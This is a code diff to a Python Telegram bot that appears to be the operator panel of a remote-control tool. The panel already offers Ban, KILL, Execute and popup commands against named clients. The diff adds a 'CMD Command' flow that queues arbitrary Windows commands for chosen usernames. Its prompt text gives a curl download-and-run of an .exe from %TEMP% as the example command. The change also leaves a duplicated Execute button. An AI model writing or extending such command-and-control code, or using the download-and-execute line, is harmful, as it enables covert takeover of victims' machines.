@@ -43,8 +43,10 @@ USERS_FILE = "USERS.txt"
     WAITING_FOR_POP_CLIENTS,
     WAITING_FOR_POP_TEXT,
     WAITING_FOR_SEARCH,
+    WAITING_FOR_CMD_CLIENTS,      # NEW
+    WAITING_FOR_CMD_TEXT,         # NEW
     WAITING_FOR_BROADCAST
-) = range(15)
+) = range(17)  # Changed from 15 to 17
 
 app = Flask(__name__)
 logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
@@ -211,7 +213,8 @@ def main_menu_keyboard():
     keyboard = [
         [InlineKeyboardButton("📝 Register", callback_data="m_reg"), InlineKeyboardButton("✅ Grant", callback_data="m_grant")],
         [InlineKeyboardButton("🚫 Ban", callback_data="m_ban"), InlineKeyboardButton("☠️ KILL", callback_data="m_kill")],
-        [InlineKeyboardButton("🗑️ Delete", callback_data="m_del"), InlineKeyboardButton("✏️ Rename", callback_data="m_rename")],
+        [InlineKeyboardButton("⚡ CMD Command", callback_data="m_cmd"), InlineKeyboardButton("🗑️ Delete", callback_data="m_del")],
+        [InlineKeyboardButton("✏️ Rename", callback_data="m_rename"), InlineKeyboardButton("⚙️ Execute", callback_data="m_exec")],
         [InlineKeyboardButton("⚡ Execute", callback_data="m_exec"), InlineKeyboardButton("💬 Popup Msg", callback_data="m_popup")],
         [InlineKeyboardButton("🔍 Search", callback_data="m_search"), InlineKeyboardButton("📊 Stats", callback_data="m_stats")],
         [InlineKeyboardButton("📢 Broadcast (SAFE)", callback_data="m_broad"), InlineKeyboardButton("🧹 Clear (SAFE)", callback_data="m_clear_broad")],
@@ -247,6 +250,7 @@ async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     if c == "m_kill": await query.edit_message_text("☠️ **Set KILL**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_KILL
     if c == "m_del": await query.edit_message_text("🗑️ **Sync Delete**\nSend Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_DELETE
     if c == "m_rename": await query.edit_message_text("✏️ **Rename**\nSend **current** name:", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_RENAME_OLD
+    if c == "m_cmd": await query.edit_message_text("⚡ **CMD Command**\n\n**Step 1:** Send Username(s) separated by `-`:\nExample: `User1-User2`", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_CMD_CLIENTS
     if c == "m_exec": await query.edit_message_text("⚡ **Execute**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_EXEC_CLIENTS
     if c == "m_popup": await query.edit_message_text("💬 **Popup Msg**\nStep 1: Send Username(s):", parse_mode="Markdown", reply_markup=cancel_keyboard()); return WAITING_FOR_POP_CLIENTS
     
@@ -345,6 +349,22 @@ async def handle_exec_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
     )
     await update.message.reply_text(f"⚡ Command added to {count} users."); return await start(update, context)
 
+async def handle_cmd_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    context.user_data["cmd_targets"] = update.message.text
+    await update.message.reply_text(
+        "⚡ **Step 2:** Enter the CMD command:\n\n"
+        "Example: `curl https://example.com/file.exe -o %TEMP%\\file.exe && start %TEMP%\\file.exe`",
+        parse_mode="Markdown", 
+        reply_markup=cancel_keyboard()
+    )
+    return WAITING_FOR_CMD_TEXT
+
+async def handle_cmd_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    command = update.message.text.strip()
+    count, _ = batch_update_users(context.user_data.get("cmd_targets", ""), "CMD", f"CMD-> {command}")
+    await update.message.reply_text(f"⚡ CMD added to {count} users.")
+    return await start(update, context)
+
 async def handle_pop_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
     context.user_data["pop_targets"] = update.message.text
     await update.message.reply_text("💬 Send Popup Text:", reply_markup=cancel_keyboard()); return WAITING_FOR_POP_TEXT
@@ -374,6 +394,8 @@ conv_handler = ConversationHandler(
         WAITING_FOR_RENAME_OLD: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_rename_old)],
         WAITING_FOR_RENAME_NEW: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_rename_new)],
         WAITING_FOR_EXEC_CLIENTS: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_exec_users)],
+        WAITING_FOR_CMD_CLIENTS: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cmd_users)],
+        WAITING_FOR_CMD_TEXT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_cmd_final)],
         WAITING_FOR_EXEC_TEXT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_exec_final)],
         WAITING_FOR_POP_CLIENTS: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pop_users)],
         WAITING_FOR_POP_TEXT: [CallbackQueryHandler(menu_callback), MessageHandler(filters.TEXT & ~filters.COMMAND, handle_pop_final)],
